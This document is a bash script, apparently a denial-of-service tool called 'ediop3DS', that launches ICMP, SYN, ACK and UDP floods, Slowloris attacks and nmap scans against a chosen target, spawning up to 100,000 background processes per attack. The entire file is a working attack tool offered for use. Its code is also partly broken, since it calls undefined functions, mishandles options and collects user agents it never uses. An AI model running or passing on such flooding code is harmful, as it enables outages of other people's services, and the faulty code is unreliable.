#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
    echo -e "  -F     Test firewall"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Function to read user agents from the file
read_user_agents() {
    user_agents_file="user_agents.txt"
    if [ ! -f "$user_agents_file" ]; then
        echo -e "${RED}[-] User agents file not found: $user_agents_file${RESET}"
        exit 1
    fi
    mapfile -t user_agents < "$user_agents_file"
}

# Function to perform ICMP flood with user agents
http_icmp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting ICMP Ping flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        ping -c 1 -f -t 255 $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform SYN flood attack with user agents
syn_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        python3 syn_flood.py -t $target -p $port > /dev/null 2>&1 &
    done
    wait
}

# Function to perform ACK flood attack with user agents
ack_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        hping3 -A -p $port $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform UDP flood attack with user agents
udp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
    read_user_agents
    for ((i=0; i<100000; i++)); do
        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        hping3 --udp -p $port $target > /dev/null 2>&1 &
    done
    wait
}

# Function to perform Slowloris attack with installation check
check_and_run_slowloris() {
    target=$1
    echo -e "${CYAN}[*] Checking if Slowloris is installed...${RESET}"
    if command -v slowloris &>/dev/null; then
        echo -e "${GREEN}[+] Slowloris found! Starting Slowloris attack on $target${RESET}"
        read_user_agents
        for ((i=0; i<100000; i++)); do
            random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
            slowloris $target --port $port &
        done
    else
        echo -e "${RED}[-] Slowloris is not installed. Please install it using either 'git clone' or 'pip3 install slowloris'.${RESET}"
    fi
}

# Function to perform firewall test (using Nmap)
test_firewall() {
    target=$1
    echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
    nmap -p- --open --min-rate=5000 -T4 $target
}

# Main function to handle user input
while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:F" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) http_icmp_flood "$target";;
        r) retry_attack "$target";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) check_and_run_slowloris "$target";;
        t) attack_type="$OPTARG";;
        F) test_firewall "$target";;
        *) show_help;;
    esac
done
